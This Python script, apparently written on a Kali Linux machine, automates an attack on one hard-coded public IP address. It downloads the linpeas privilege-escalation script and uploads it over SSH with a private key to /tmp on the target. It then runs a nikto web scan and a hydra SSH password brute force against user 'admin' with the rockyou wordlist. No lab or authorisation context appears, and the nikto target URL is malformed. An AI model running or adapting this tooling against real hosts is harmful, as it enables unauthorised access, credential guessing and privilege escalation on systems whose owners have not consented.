import paramiko
import subprocess
import sys
import signal
from contextlib import contextmanager

TARGET = "51.145.251.231"
USER = "ubuntu"
KEY = "/home/kali/Desktop/dev.pm"
LINPEAS = "https://github.com/carlospolop/PEASS-ng/releases/download/20220731/linpeas.sh"
NIKTO = "http://"+TARGET +".com"
HYDRA = TARGET
LOGIN = "admin"
LIST = "/usr/share/wordlists/rockyou.txt"

class Timeout(Exception):
    pass

@contextmanager
def limit(s):
    def handler(signum, frame):
        raise Timeout("Timed out!")
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(s)
    try:
        yield
    finally:
        signal.alarm(0)

def dl_and_trans():
    try:
        with limit(120):
            subprocess.run(["wget", LINPEAS, "-O", "linpeas.sh"], timeout=120)
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            pkey = paramiko.RSAKey.from_private_key_file(KEY)
            ssh.connect(TARGET, username=USER, pkey=pkey)
            
            sftp = ssh.open_sftp()
            sftp.put('linpeas.sh', '/tmp/linpeas.sh')
            sftp.close()
            ssh.close()
            print("Transferred.")
    except Timeout:
        print("Timed out")

def nikto():
    try:
        with limit(120):
            subprocess.run(["nikto", "-h", NIKTO], timeout=120)
    except Timeout:
        print("Timed out")

def hydra():
    try:
        with limit(120):
            subprocess.run(["hydra", "-l", LOGIN, "-P", LIST, "-t", "4", "ssh://" + HYDRA], timeout=120)
    except Timeout:
        print("Timed out")

if __name__ == "__main__":
    dl_and_trans()
    nikto()
    hydra()
